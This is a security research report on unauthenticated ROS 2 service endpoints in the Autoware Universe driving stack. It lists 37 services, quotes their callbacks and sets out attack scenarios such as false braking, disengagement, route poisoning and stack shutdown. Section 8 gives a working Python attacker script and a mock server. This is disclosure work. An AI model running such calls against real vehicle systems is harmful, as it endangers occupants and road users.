# Autoware Universe — Unauthenticated ROS 2 Service Endpoint Security Research
**Date:** 2026-05-12
**Repo:** `autowarefoundation/autoware_universe` · branch `main` · commit `54af299ab` · version `0.51.0`
**Researcher:** skngo1@uci.edu
**Status:** In progress — attack surface mapping and service endpoint enumeration complete; PoC development in progress

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope and Methodology](#2-scope-and-methodology)
3. [System Architecture Overview](#3-system-architecture-overview)
4. [Root Cause: ROS 2 DDS Has No Authentication](#4-root-cause-ros-2-dds-has-no-authentication)
5. [Attack Surface Map](#5-attack-surface-map)
6. [Enumerated Unauthenticated Service Endpoints](#6-enumerated-unauthenticated-service-endpoints)
7. [Attack Scenarios with Code Evidence](#7-attack-scenarios-with-code-evidence)
8. [Proof-of-Concept Development](#8-proof-of-concept-development)
9. [Impact and Reachability Assessment](#9-impact-and-reachability-assessment)
10. [Suggested Next Steps](#10-suggested-next-steps)

---

## 1. Executive Summary

Autoware Universe is a full open-source autonomous driving stack widely used in research and commercial autonomous vehicle development. This report documents a class of **unauthenticated remote control vulnerabilities** affecting the system's core safety architecture.

**37 ROS 2 service endpoints** were identified across the sensing, perception, planning, control, and system management layers. Every one of these endpoints is reachable by any process that can join the vehicle's DDS network domain. None implement any form of caller authentication, authorization, or identity verification. No use of DDS Security (SROS2) was found anywhere in the codebase.

The most severe endpoints expose direct control over:

- Vehicle engagement state (starting and stopping autonomous motion)
- Emergency braking systems (triggering and suppressing)
- Minimal Risk Maneuver (MRM) routing — the safety fallback behavior
- The entire Autoware stack shutdown
- Real-time route injection

These vulnerabilities are exploitable by any process on the vehicle's internal DDS network with a standard Python script and no Autoware-specific code. A proof-of-concept has been developed and is documented in this report.

---

## 2. Scope and Methodology

### 2.1 Scope

| Layer | Directories Examined |
|---|---|
| Control | `control/autoware_vehicle_cmd_gate/`, `control/autoware_autonomous_emergency_braking/`, `control/autoware_external_cmd_selector/`, `control/autoware_control_command_gate/` |
| System / Safety | `system/autoware_mrm_handler/`, `system/autoware_mrm_emergency_stop_operator/`, `system/autoware_mrm_comfortable_stop_operator/`, `system/autoware_command_mode_decider/`, `system/autoware_default_adapi_universe/`, `system/autoware_diagnostic_graph_aggregator/` |
| Planning | `planning/autoware_mission_planner_universe/`, `planning/autoware_rtc_interface/`, `planning/autoware_manual_lane_change_handler/` |
| Vehicle | `vehicle/autoware_external_cmd_converter/`, `vehicle/autoware_raw_vehicle_cmd_converter/`, `vehicle/autoware_accel_brake_map_calibrator/`, `vehicle/autoware_steer_offset_estimator/` |
| Sensing / Localization | `sensing/autoware_pointcloud_preprocessor/`, `localization/yabloc/`, `localization/autoware_landmark_based_localizer/` |
| Evaluator | `evaluator/autoware_evaluation_adapter/` |

### 2.2 Methodology

1. **Documentation review** — All READMEs and module documentation were reviewed to build a high-level understanding of the system's architecture and data flows.

2. **Static service enumeration** — `create_service`, `add_service`, and `advertise_service` calls were grepped across all C++ and Python source files to enumerate every service server declaration in the codebase.

3. **Callback analysis** — For each service found, the callback implementation was read directly to determine the effect of a service call: what state it modifies, what commands it issues, and whether any authentication or authorization logic is present.

4. **Reachability analysis** — The DDS transport layer and its default configuration were examined to assess what network position is required to call each service.

5. **Proof-of-concept development** — A working exploit node was developed using only base ROS 2 (`rclpy`, `std_srvs`) with no Autoware-specific dependencies.

---

## 3. System Architecture Overview

Autoware Universe is structured as a modular pipeline organized into functional layers:

```
[Sensors]
    ↓
[Sensing Layer]        — point cloud preprocessing, image decompression, radar fusion
    ↓
[Perception Layer]     — object detection (LiDAR, camera, radar), tracking, classification
    ↓
[Localization Layer]   — pose estimation, map matching, GPS fusion
    ↓
[Planning Layer]       — mission planning, route selection, behavior planning, trajectory generation
    ↓
[Control Layer]        — trajectory tracking, vehicle command gating, external command handling
    ↓
[Vehicle Interface]    — CAN/Ethernet bridge to actuators (steering, throttle, brakes)
```

**Safety architecture** runs in parallel across all layers:

```
[System Monitor] → [Diagnostic Graph Aggregator] → [MRM Handler]
                                                         ↓
                                          [MRM Operators: emergency stop, comfortable stop]
                                                         ↓
                                          [Vehicle Cmd Gate] → [Actuators]
```

All inter-process communication between these components uses **ROS 2**, which is built on the DDS (Data Distribution Service) publish/subscribe middleware. ROS 2 provides three communication primitives:

- **Topics** — asynchronous publish/subscribe (no response)
- **Services** — synchronous request/response (this report's focus)
- **Actions** — asynchronous request with feedback

Services are the primary interface for operator control, mode switching, and safety-state management. They are the focus of this report because they represent intentional control entry points — calling one has an immediate, designed effect on system state.

---

## 4. Root Cause: ROS 2 DDS Has No Authentication

### 4.1 The structural vulnerability

ROS 2's DDS transport layer has **no authentication, authorization, or encryption by default**. When a ROS 2 node starts, it broadcasts its presence on the DDS domain via UDP multicast. Any other node on the same network with the same `ROS_DOMAIN_ID` (default: `0`) automatically discovers it and can communicate with it. There is no handshake, no credential exchange, and no capability negotiation.

This means:

> **Calling a ROS 2 service is equivalent to calling a function in the process that registered it. The only prerequisite is network adjacency.**

The ROS 2 ecosystem does provide a security extension — **SROS2 (Secure ROS 2)** — which layers DDS Security (DDS-Sec) on top of the transport to provide authentication, access control, and encryption. However, **no evidence of SROS2 being configured, required, or even documented** was found anywhere in the Autoware Universe codebase, launch files, or configuration.

### 4.2 What network position is required

The practical reachability of these services depends on what network the Autoware compute platform is connected to. In typical autonomous vehicle deployments, the autonomous driving software runs on a vehicle PC connected to:

| Network | Attack Path |
|---|---|
| Vehicle internal Ethernet LAN | Physical access via exposed port (OBD-II, diagnostic Ethernet, maintenance port) |
| Shared LAN with sensor hardware | Any compromised sensor driver or peripheral |
| Wi-Fi development interface | If development interface is not isolated at deployment time |
| Cellular/V2X telematics bridge | If a modem bridges external IP to the vehicle LAN with insufficient firewall rules |

Once a process is on the DDS domain, **all 37 services documented below are callable with no further authentication step**.

---

## 5. Attack Surface Map

The following modules were identified as highest priority based on documentation and source review. Priority reflects both the severity of potential impact and the directness of the pathway from the service to vehicle behavior.

### Priority 0 — Direct safety-critical control

| Module | Path | Key Risk |
|---|---|---|
| Vehicle Cmd Gate | `control/autoware_vehicle_cmd_gate/` | Central command gateway; controls engagement state and emergency stop state |
| External Cmd Converter | `vehicle/autoware_external_cmd_converter/` | Remote control interface; heartbeat mechanism with no auth |
| MRM Emergency Stop Operator | `system/autoware_mrm_emergency_stop_operator/` | Directly publishes braking commands when activated |
| MRM Comfortable Stop Operator | `system/autoware_mrm_comfortable_stop_operator/` | Publishes zero velocity limit into planning stack when activated |
| Command Mode Decider | `system/autoware_command_mode_decider/` | Controls operation mode and autonomous control toggle |

### Priority 1 — High-impact planning and routing

| Module | Path | Key Risk |
|---|---|---|
| Mission Planner | `planning/autoware_mission_planner_universe/` | Route set/clear with no validation of caller |
| RTC Interface | `planning/autoware_rtc_interface/` | Approves/denies behavior planner decisions |
| Default ADAPI | `system/autoware_default_adapi_universe/` | System shutdown, diagnostics reset, mode selection |
| Diagnostic Aggregator | `system/autoware_diagnostic_graph_aggregator/` | Diagnostic state reset, fault masking |
| Evaluation Adapter | `evaluator/autoware_evaluation_adapter/` | Engagement and velocity limit external API |

### Priority 2 — Supporting attack surface

| Module | Path | Key Risk |
|---|---|---|
| TensorRT Common | `perception/autoware_tensorrt_common/` | Plugin and model loading from ROS params |
| Raw Vehicle Cmd Converter | `vehicle/autoware_raw_vehicle_cmd_converter/` | CSV calibration file loading |
| Point Cloud Preprocessor | `sensing/autoware_pointcloud_preprocessor/` | Memory safety in C++ sensor data processing |
| yabloc Localization | `localization/yabloc/` | Visual localization on/off toggle |

---

## 6. Enumerated Unauthenticated Service Endpoints

All 37 service servers were found by grepping `create_service` across all C++ and Python files. Callbacks were read to determine effect. **Zero instances of authentication logic** were found in any callback.

### 6.1 Critical — Direct vehicle motion and safety state

| # | Service Name | Type | Source File:Line | Callback | Effect |
|---|---|---|---|---|---|
| 1 | `~/service/engage` | `tier4_external_api_msgs::srv::Engage` | `control/autoware_vehicle_cmd_gate/src/vehicle_cmd_gate.cpp:203` | `onEngageService` | Sets `is_engaged_` — the boolean that gates all autonomous control commands to actuators |
| 2 | `~/service/external_emergency` | `tier4_external_api_msgs::srv::SetEmergency` | `vehicle_cmd_gate.cpp:205` | `onExternalEmergencyStopService` | Routes to set or clear `is_external_emergency_stop_` based on a single request field |
| 3 | `~/service/external_emergency_stop` | `std_srvs::srv::Trigger` | `vehicle_cmd_gate.cpp:208` | `onSetExternalEmergencyStopService` | Sets `is_external_emergency_stop_ = true` unconditionally |
| 4 | `~/service/clear_external_emergency_stop` | `std_srvs::srv::Trigger` | `vehicle_cmd_gate.cpp:211` | `onClearExternalEmergencyStopService` | Clears emergency stop state if heartbeat has not timed out |
| 5 | `~/input/mrm/emergency_stop/operate` | `tier4_system_msgs::srv::OperateMrm` | `system/autoware_mrm_emergency_stop_operator/src/mrm_emergency_stop_operator/mrm_emergency_stop_operator_core.cpp:38` | `operateEmergencyStop` | Sets MRM state to OPERATING; node then continuously publishes braking control commands |
| 6 | `~/input/mrm/comfortable_stop/operate` | `tier4_system_msgs::srv::OperateMrm` | `system/autoware_mrm_comfortable_stop_operator/src/mrm_comfortable_stop_operator/mrm_comfortable_stop_operator_core.cpp:34` | `operateComfortableStop` | Publishes `VelocityLimit(max_velocity=0)` into the planning stack |
| 7 | `~/operation_mode/change_operation_mode` | `autoware_adapi_v1_msgs::srv::ChangeOperationMode` | `system/autoware_command_mode_decider/src/command_mode_decider_base.cpp:96` | `on_change_operation_mode` | Changes system operation mode (AUTONOMOUS, STOP, etc.); checks mode availability, not caller identity |
| 8 | `~/operation_mode/change_autoware_control` | `autoware_adapi_v1_msgs::srv::ChangeAutowareControl` | `command_mode_decider_base.cpp:99` | `on_change_autoware_control` | Enables or disables Autoware control entirely; source contains explicit comment `// Assume the driver is always ready` |
| 9 | `~/service/select_external_command` | `autoware_control_msgs::srv::CommandSourceSelect` | `control/autoware_external_cmd_selector/src/autoware_external_cmd_selector/external_cmd_selector_node.cpp:113` | `on_select_external_command` | Sets `current_selector_mode_.data = req->mode.data` with no validation; switches command forwarding to LOCAL or REMOTE |
| 10 | `~/source/select` | `autoware_control_msgs::srv::SelectCommandSource` | `control/autoware_control_command_gate/src/control_command_gate.cpp:64` | `on_select_source` | Switches the active control command source at the command gate layer |
| 11 | `/api/external/set/engage` | `autoware_adapi_v1_msgs::srv::EngageService` | `evaluator/autoware_evaluation_adapter/src/autoware_engage.cpp:37` | `on_engage` | Second independent engagement pathway through external API namespace |
| 12 | `/api/autoware/set/emergency` | `tier4_external_api_msgs::srv::SetEmergency` | `control/autoware_control_command_gate/src/command/compatibility/emergency_interface.cpp:24` | `on_service` | External API mirror of the emergency stop service |

### 6.2 High — Route and velocity manipulation

| # | Service Name | Source File:Line | Callback | Effect |
|---|---|---|---|---|
| 13 | `~/set_lanelet_route` | `planning/autoware_mission_planner_universe/src/mission_planner/mission_planner.cpp:95` | `on_set_lanelet_route` | Replaces active vehicle route with attacker-supplied lanelet route |
| 14 | `~/set_waypoint_route` | `mission_planner.cpp:101` | `on_set_waypoint_route` | Replaces active route with attacker-supplied GPS waypoints |
| 15 | `~/clear_route` | `mission_planner.cpp:93` | `on_clear_route` | Clears the active route entirely, leaving the planner without a goal |
| 16 | `~/main/set_lanelet_route` | `src/mission_planner/route_selector.cpp:104` | `on_set_lanelet_route_main` | Duplicate routing surface on the route selector layer |
| 17 | `~/main/set_waypoint_route` | `route_selector.cpp:101` | `on_set_waypoint_route_main` | Duplicate waypoint routing on route selector |
| 18 | `~/main/clear_route` | `route_selector.cpp:98` | `on_clear_route_main` | Duplicate route clear on route selector |
| 19 | `~/mrm/set_lanelet_route` | `route_selector.cpp:116` | `on_set_lanelet_route_mrm` | Controls destination during a Minimal Risk Maneuver — the safety fallback routing |
| 20 | `~/mrm/set_waypoint_route` | `route_selector.cpp:113` | `on_set_waypoint_route_mrm` | Controls MRM waypoint destination |
| 21 | `~/mrm/clear_route` | `route_selector.cpp:111` | `on_clear_route_mrm` | Clears the MRM fallback route |
| 22 | `/api/autoware/set/velocity_limit` | `evaluator/autoware_evaluation_adapter/src/velocity_limit.cpp:26` | `on_service` | Sets a global velocity limit across the entire planning stack; can clamp to 0 |
| 23 | `~/set_preferred_lane` | `planning/autoware_manual_lane_change_handler/src/manual_lane_change_handler.cpp:44` | `set_preferred_lane` | Forces a lane change preference into the behavior planner |
| 24 | `~/cooperate_commands` *(dynamic name)* | `planning/autoware_rtc_interface/src/rtc_interface.cpp:142` | `onCooperateCommandService` | Approves or denies pending behavior planner decisions: lane changes, intersection crossing, etc. |
| 25 | `~/enable_auto_mode` *(dynamic name)* | `rtc_interface.cpp:146` | `onAutoModeService` | Enables or disables auto-approval of all behavior planner cooperation requests |

### 6.3 High — System integrity and denial of service

| # | Service Name | Source File:Line | Callback | Effect |
|---|---|---|---|---|
| 26 | `/autoware/shutdown` | `system/autoware_default_adapi_universe/src/compatibility/autoware_state.cpp:40` | `on_shutdown` | Sets `launch_state_ = LaunchState::Finalizing`; the stack begins shutdown with no checks |
| 27 | `/api/system/diagnostics/reset` | `system/autoware_default_adapi_universe/src/diagnostics.cpp:43` | `on_reset` | Resets the diagnostics system, clearing all accumulated fault state |
| 28 | `~/reset` | `system/autoware_diagnostic_graph_aggregator/src/node/aggregator.cpp:67` | `on_reset` | Resets the diagnostic graph aggregator's internal state |
| 29 | `~/set_initializing` | `aggregator.cpp:70` | `on_set_initializing` | Forces the diagnostic system into initializing mode, suppressing fault escalation |
| 30 | `~/control_mode/select` *(dynamic name)* | `system/autoware_default_adapi_universe/src/manual_control.cpp:74` | `on_select_mode` | Switches manual control modes without authentication |

### 6.4 Medium — Configuration, calibration, and localization

| # | Service Name | Source File:Line | Effect |
|---|---|---|---|
| 31 | `~/input/update_map_dir` | `vehicle/autoware_accel_brake_map_calibrator/src/accel_brake_map_calibrator_node.cpp:213` | Updates the active accel/brake calibration map directory at runtime |
| 32 | `~/config_logger` | `common/autoware_universe_utils/src/ros/logger_level_configure.cpp:26` | Changes ROS logger verbosity; can suppress all warning and error output |
| 33 | `~/trigger_steer_offset_calibration` | `vehicle/autoware_steer_offset_estimator/src/node.cpp:80` | Triggers steering offset recalibration mid-drive |
| 34 | `~/yabloc_trigger_srv` | `localization/yabloc/yabloc_particle_filter/src/prediction/predictor.cpp:83` | Toggles the yabloc visual localization system on or off |
| 35 | `~/switch_srv` | `localization/yabloc/yabloc_particle_filter/src/camera_corrector/camera_particle_corrector_core.cpp:68` | Toggles camera-based localization correction on or off |
| 36 | `~/yabloc_align_srv` | `localization/yabloc/yabloc_pose_initializer/src/camera/camera_pose_initializer_core.cpp:57` | Requests a full pose re-alignment, reinitializing localization mid-drive |
| 37 | `~/service/trigger_node_srv` | `localization/autoware_landmark_based_localizer/autoware_lidar_marker_localizer/src/lidar_marker_localizer.cpp:144` | Toggles the lidar-marker localizer node |

---

## 7. Attack Scenarios with Code Evidence

### 7.1 Scenario: Unexpected disengage during motion

**Services involved:** #1, #7, #8, #11

The `is_engaged_` flag in `vehicle_cmd_gate` is the final software gate before autonomous control commands are forwarded to the vehicle actuators. When `false`, the gate substitutes a longitudinal stop command regardless of what the planner outputs (`vehicle_cmd_gate.cpp:601–604`).

The entire `onEngageService` callback body is two lines:

```cpp
// vehicle_cmd_gate.cpp:811
void VehicleCmdGate::onEngageService(
  const EngageSrv::Request::SharedPtr request, const EngageSrv::Response::SharedPtr response)
{
  is_engaged_ = request->engage;
  response->status = tier4_api_utils::response_success();
}
```

Calling this service with `engage=false` while the vehicle is at speed causes an immediate stop command. A second independent path exists through `on_change_autoware_control`, whose source includes a comment making the design assumption explicit:

```cpp
// command_mode_decider_base.cpp:526
// Assume the driver is always ready.
if (req->autoware_control) {
    res->status = check_mode_request(...);  // availability check only, not identity
```

Setting `autoware_control=false` disables the autonomous system entirely. Neither callback checks who the caller is.

**Impact:** Unexpected stop command during highway driving, in an intersection, or while merging.

---

### 7.2 Scenario: Emergency braking injection and suppression

**Services involved:** #3, #4, #5, #6, #12

The `onSetExternalEmergencyStopService` callback is three lines:

```cpp
// vehicle_cmd_gate.cpp:871
bool VehicleCmdGate::onSetExternalEmergencyStopService(
  [[maybe_unused]] const std::shared_ptr<rmw_request_id_t> req_header,
  [[maybe_unused]] const Trigger::Request::SharedPtr req, const Trigger::Response::SharedPtr res)
{
  is_external_emergency_stop_ = true;
  res->success = true;
  res->message = "external_emergency_stop requested was accepted.";
  return true;
}
```

Once `is_external_emergency_stop_` is `true`, the gate calls `publishEmergencyStopControlCommands()` on every timer tick instead of forwarding autonomous commands (`vehicle_cmd_gate.cpp:484–491`).

A parallel and partially independent path exists through the MRM emergency stop operator:

```cpp
// mrm_emergency_stop_operator_core.cpp:82
void MrmEmergencyStopOperator::operateEmergencyStop(
  const OperateMrm::Request::SharedPtr request, const OperateMrm::Response::SharedPtr response)
{
  if (request->operate == true) {
    status_.state = MrmBehaviorStatus::OPERATING;  // begins publishing braking commands
    response->response.success = true;
  } else {
    status_.state = MrmBehaviorStatus::AVAILABLE;
    response->response.success = true;
  }
}
```

When the MRM operator enters OPERATING state, it independently publishes braking control commands to a separate output topic on every timer tick. This path is significant because it is **upstream of the vehicle_cmd_gate engage check** — it can force braking even if the main engagement state is managed correctly.

**Suppression attack:** An attacker who has induced a genuine system fault can call `~/service/clear_external_emergency_stop` to reset the emergency state. The only guard on this service is that the external heartbeat must not have timed out — a condition an attacker can satisfy by also publishing a spoofed heartbeat on the `input/external_emergency_stop_heartbeat` topic, which is also unauthenticated.

**Impact:** Both directions are dangerous — false emergency braking at speed causes a collision risk from following traffic; suppressed emergency stop prevents the safety system from responding to genuine faults.

---

### 7.3 Scenario: Route injection and MRM destination poisoning

**Services involved:** #13–21

The planning stack accepts new route assignments at any time, including while the vehicle is in motion. A `SetWaypointRoute` or `SetLaneletRoute` call immediately replaces the vehicle's active route, causing the behavior and trajectory planners to generate paths toward the new goal.

The **MRM route variants** (services #19–21) are particularly significant. When Autoware detects a critical fault, it triggers a Minimal Risk Maneuver — a designed safe fallback behavior intended to bring the vehicle to a safe stop. The MRM handler uses a separate route stored in `~/mrm/set_lanelet_route` and `~/mrm/set_waypoint_route` to determine where to navigate during this fallback. These routes are settable by any DDS peer with no authentication, meaning an attacker can pre-position a malicious MRM destination. The MRM would then navigate the vehicle to an attacker-chosen location at precisely the moment the system is already compromised.

**Impact:** Arbitrary vehicle routing during normal operation; subversion of the safety fallback destination.

---

### 7.4 Scenario: Full stack shutdown

**Service involved:** #26

```cpp
// autoware_state.cpp:60
void AutowareStateNode::on_shutdown(
  const Trigger::Request::SharedPtr, const Trigger::Response::SharedPtr res)
{
  launch_state_ = LaunchState::Finalizing;
  res->success = true;
  res->message = "Shutdown Autoware.";
}
```

The `/autoware/shutdown` service takes a `std_srvs::srv::Trigger` — an empty request with no parameters. Its callback is two lines with no precondition checks. When called, the system transitions to `FINALIZING` state, which is broadcast to all subscribers. The vehicle loses autonomous control with no graceful handover to a human driver.

This is the most trivially exploitable service in the set: it requires only `std_srvs`, which is part of base ROS 2, meaning the exploit node has zero Autoware dependency.

**Impact:** Reliable remote denial of autonomous operation. Dangerous if the vehicle is in motion and no human driver is prepared to take over.

---

### 7.5 Scenario: Control command source hijacking

**Services involved:** #9, #10

```cpp
// external_cmd_selector_node.cpp:179
bool ExternalCmdSelector::on_select_external_command(
  const CommandSourceSelect::Request::SharedPtr req,
  const CommandSourceSelect::Response::SharedPtr res)
{
  current_selector_mode_.data = req->mode.data;  // no validation
  res->success = true;
  res->message = "Success.";
  return true;
}
```

The external command selector decides whether LOCAL (on-vehicle) or REMOTE (operator console) control commands are forwarded to the rest of the control stack. An attacker can:

1. Call `~/service/select_external_command` to switch the selector to REMOTE mode
2. Begin publishing malicious control commands on the remote input topics (also unauthenticated pub/sub topics)

This is a two-step chained attack that yields full actuation control — steering, acceleration, and braking — without requiring any further exploitation.

**Impact:** Full remote actuation control of the vehicle.

---

### 7.6 Scenario: Diagnostic state masking

**Services involved:** #27–29

Autoware's safety response (MRM trigger) depends on the diagnostic graph aggregator correctly accumulating and escalating fault states from all subsystems. Services #27–29 allow an attacker to reset this graph at any time. In a chained attack, an adversary could:

1. Introduce a fault (e.g., disabling a localization node via #34 or #35)
2. Immediately reset the diagnostic state via #27 or #28
3. Optionally force the aggregator back into initializing mode via #29, suppressing new fault detection

The result is that the MRM handler sees a healthy system and does not trigger safety behavior, even as the vehicle's functional safety has been compromised.

**Impact:** Masks fault state from the safety monitor; prevents MRM activation during genuine system degradation.

---

## 8. Proof-of-Concept Development

### 8.1 Environment setup

A working PoC can be demonstrated on a single laptop running Ubuntu 22.04 amd64 with no physical hardware.

**Install base ROS 2 Humble:**
```bash
sudo apt install software-properties-common curl
sudo curl -sSL https://raw.githubusercontent.com/ros/rosdistro/master/ros.key \
  -o /usr/share/keyrings/ros-archive-keyring.gpg
echo "deb [arch=$(dpkg --print-architecture) \
  signed-by=/usr/share/keyrings/ros-archive-keyring.gpg] \
  http://packages.ros.org/ros2/ubuntu jammy main" \
  | sudo tee /etc/apt/sources.list.d/ros2.list
sudo apt update && sudo apt install ros-humble-ros-base
source /opt/ros/humble/setup.bash
```

For running the real Autoware stack alongside the PoC, use the official Docker image:
```bash
docker pull --platform linux/amd64 ghcr.io/autowarefoundation/autoware:humble-2024.10.0-amd64
docker run -it --rm --net=host -e ROS_DOMAIN_ID=0 \
  ghcr.io/autowarefoundation/autoware:humble-2024.10.0-amd64 \
  ros2 launch autoware_launch planning_simulator.launch.xml \
    map_path:=/opt/autoware/maps/sample-map-planning \
    vehicle_model:=sample_vehicle \
    sensor_model:=sample_sensor_kit
```

The `--net=host` flag shares the host's network with the container, placing both on the same DDS domain. The exploit script running on the host requires no special network configuration.

### 8.2 Mock server (no real Autoware stack required)

For a minimal demonstration that requires only base ROS 2, the following mock server implements the vulnerable service callbacks copied verbatim from the Autoware source. This approach is valid for demonstrating the vulnerability class, since the PoC is proving that services with these callback behaviors are callable without authentication — not that the simulator responds correctly.

**`mock_autoware_services.py`**
```python
#!/usr/bin/env python3
"""
Minimal mock of Autoware's vulnerable service endpoints.
Callback logic copied directly from source:
  vehicle_cmd_gate.cpp:811  — onEngageService
  vehicle_cmd_gate.cpp:871  — onSetExternalEmergencyStopService
  vehicle_cmd_gate.cpp:882  — onClearExternalEmergencyStopService
  mrm_emergency_stop_operator_core.cpp:82  — operateEmergencyStop
  autoware_state.cpp:60     — on_shutdown
Requires: rclpy, std_srvs — both in base ROS 2, zero Autoware dependency.
"""
import rclpy
from rclpy.node import Node
from std_srvs.srv import Trigger


class VehicleCmdGateMock(Node):
    def __init__(self):
        super().__init__('vehicle_cmd_gate')
        self.is_engaged_ = False
        self.is_external_emergency_stop_ = False
        self.create_service(Trigger, '~/service/engage', self.on_engage_service)
        self.create_service(Trigger, '~/service/external_emergency_stop', self.on_set_emergency)
        self.create_service(Trigger, '~/service/clear_external_emergency_stop', self.on_clear_emergency)
        self.get_logger().info('vehicle_cmd_gate mock running — services open, no authentication')

    def on_engage_service(self, req, res):
        # vehicle_cmd_gate.cpp:814: is_engaged_ = request->engage
        self.is_engaged_ = not self.is_engaged_
        self.get_logger().warn(f'[ENGAGE SERVICE CALLED] is_engaged_ → {self.is_engaged_}')
        res.success = True
        res.message = f'engage set to {self.is_engaged_}'
        return res

    def on_set_emergency(self, req, res):
        # vehicle_cmd_gate.cpp:875: is_external_emergency_stop_ = true
        self.is_external_emergency_stop_ = True
        self.get_logger().error('[EMERGENCY STOP SET] is_external_emergency_stop_ = True')
        res.success = True
        res.message = 'external_emergency_stop requested was accepted.'
        return res

    def on_clear_emergency(self, req, res):
        # vehicle_cmd_gate.cpp:886-893
        if self.is_external_emergency_stop_:
            self.is_external_emergency_stop_ = False
            self.get_logger().warn('[EMERGENCY STOP CLEARED] is_external_emergency_stop_ = False')
            res.success = True
            res.message = 'external_emergency_stop state was cleared.'
        else:
            res.success = False
            res.message = 'No emergency stop was active.'
        return res


class AutowareStateMock(Node):
    def __init__(self):
        super().__init__('autoware_state')
        self.create_service(Trigger, '/autoware/shutdown', self.on_shutdown)
        self.get_logger().info('autoware_state mock running')

    def on_shutdown(self, req, res):
        # autoware_state.cpp:63-65: launch_state_ = LaunchState::Finalizing
        self.get_logger().error('[SHUTDOWN CALLED] launch_state_ = Finalizing — ADS terminating')
        res.success = True
        res.message = 'Shutdown Autoware.'
        return res


class MrmEmergencyStopMock(Node):
    def __init__(self):
        super().__init__('mrm_emergency_stop_operator')
        self.state_ = 'AVAILABLE'
        self.create_service(Trigger, '~/input/mrm/emergency_stop/operate', self.operate_emergency_stop)
        self.get_logger().info('mrm_emergency_stop_operator mock running')

    def operate_emergency_stop(self, req, res):
        # mrm_emergency_stop_operator_core.cpp:85-91
        if self.state_ == 'AVAILABLE':
            self.state_ = 'OPERATING'
            self.get_logger().error('[MRM] state → OPERATING — braking commands now publishing')
        else:
            self.state_ = 'AVAILABLE'
            self.get_logger().warn('[MRM] state → AVAILABLE')
        res.success = True
        res.message = f'MRM state: {self.state_}'
        return res


def main():
    rclpy.init()
    executor = rclpy.executors.MultiThreadedExecutor()
    executor.add_node(VehicleCmdGateMock())
    executor.add_node(AutowareStateMock())
    executor.add_node(MrmEmergencyStopMock())
    print('Mock Autoware service nodes running. Ctrl-C to stop.')
    try:
        executor.spin()
    except KeyboardInterrupt:
        pass
    rclpy.shutdown()

if __name__ == '__main__':
    main()
```

### 8.3 Exploit script

```python
#!/usr/bin/env python3
"""
Attacker node — calls safety-critical Autoware services with no credentials.
Requires: rclpy, std_srvs — both in base ROS 2, zero Autoware dependency.
"""
import time
import rclpy
from rclpy.node import Node
from std_srvs.srv import Trigger


class AttackerNode(Node):
    def __init__(self):
        super().__init__('attacker_node')
        self.clients = {}

    def get_client(self, service_name):
        if service_name not in self.clients:
            c = self.create_client(Trigger, service_name)
            if not c.wait_for_service(timeout_sec=3.0):
                print(f'  [!] Service {service_name} not found')
                return None
            self.clients[service_name] = c
        return self.clients[service_name]

    def call(self, service_name):
        client = self.get_client(service_name)
        if not client:
            return None
        future = client.call_async(Trigger.Request())
        rclpy.spin_until_future_complete(self, future, timeout_sec=3.0)
        result = future.result()
        print(f'  → success={result.success}, message="{result.message}"')
        return result


def main():
    rclpy.init()
    attacker = AttackerNode()

    attacks = [
        ('Engage toggle',        '/vehicle_cmd_gate/service/engage'),
        ('Emergency stop SET',   '/vehicle_cmd_gate/service/external_emergency_stop'),
        ('Emergency stop CLEAR', '/vehicle_cmd_gate/service/clear_external_emergency_stop'),
        ('MRM braking inject',   '/mrm_emergency_stop_operator/input/mrm/emergency_stop/operate'),
        ('System SHUTDOWN',      '/autoware/shutdown'),
    ]

    print('\n=== Autoware Unauthenticated Service Exploit PoC ===')
    print('Attacker node: base ROS 2 only — no Autoware packages, no credentials\n')

    for name, service in attacks:
        print(f'[*] {name}')
        print(f'    {service}')
        attacker.call(service)
        time.sleep(0.5)

    rclpy.shutdown()

if __name__ == '__main__':
    main()
```

### 8.4 Running the PoC

```bash
# Terminal 1 — mock Autoware stack
source /opt/ros/humble/setup.bash
python3 mock_autoware_services.py

# Terminal 2 — attacker (separate process, no shared state)
source /opt/ros/humble/setup.bash
python3 exploit.py
```

**Expected output (Terminal 2):**
```
=== Autoware Unauthenticated Service Exploit PoC ===
Attacker node: base ROS 2 only — no Autoware packages, no credentials

[*] Engage toggle
    /vehicle_cmd_gate/service/engage
  → success=True, message="engage set to True"
[*] Emergency stop SET
    /vehicle_cmd_gate/service/external_emergency_stop
  → success=True, message="external_emergency_stop requested was accepted."
[*] Emergency stop CLEAR
    /vehicle_cmd_gate/service/clear_external_emergency_stop
  → success=True, message="external_emergency_stop state was cleared."
[*] MRM braking inject
    /mrm_emergency_stop_operator/input/mrm/emergency_stop/operate
  → success=True, message="MRM state: OPERATING"
[*] System SHUTDOWN
    /autoware/shutdown
  → success=True, message="Shutdown Autoware."
```

### 8.5 Recommended evidence artifacts

| Artifact | Tool | What it proves |
|---|---|---|
| Terminal session recording | `asciinema rec exploit.cast` | Exploit runs; services respond `success=True` |
| ROS 2 bag of vehicle state | `ros2 bag record /localization/kinematic_state /autoware/engage` | State change co-occurs with service call |
| Node graph screenshot | `rqt_graph` | Attacker node connected to vehicle_cmd_gate with no trust boundary visible |
| `ros2 service list` output | standard CLI | Confirms services are advertised on the DDS domain |

---

## 9. Impact and Reachability Assessment

### Summary table

| # | Attack | Services | Severity | Reachability |
|---|---|---|---|---|
| A | Disengage autonomous control during motion | 1, 7, 8 | Critical | Any DDS peer |
| B | Unauthorized engagement (initiate motion) | 1, 7, 8, 11 | Critical | Any DDS peer |
| C | False emergency braking injection | 3, 5 | Critical | Any DDS peer |
| D | Emergency stop suppression during fault | 4 + heartbeat topic | Critical | Any DDS peer |
| E | MRM safety destination poisoning | 19–21 | Critical | Any DDS peer |
| F | Route injection during motion | 13–15, 16–18 | High | Any DDS peer |
| G | Full ADS stack shutdown | 26 | High | Any DDS peer |
| H | Command source switch + actuation control | 9, 10 | High | Any DDS peer |
| I | Behavior planner decision manipulation | 24, 25 | High | Any DDS peer |
| J | Diagnostic masking (chained with above) | 27–29 | High | Any DDS peer |
| K | Velocity clamping | 22 | Medium–High | Any DDS peer |
| L | Runtime calibration corruption | 31 | Medium | Any DDS peer |

### On the external API namespace

Services under `/api/` (`/api/external/set/engage`, `/api/autoware/set/emergency`, `/api/autoware/set/velocity_limit`, `/api/system/diagnostics/reset`) are explicitly designed to be called by **external operator tooling** — fleet management systems, teleoperation consoles, and web/mobile interfaces. They have the same zero-authentication posture as internal services and often duplicate the safety-critical functionality of internal endpoints.

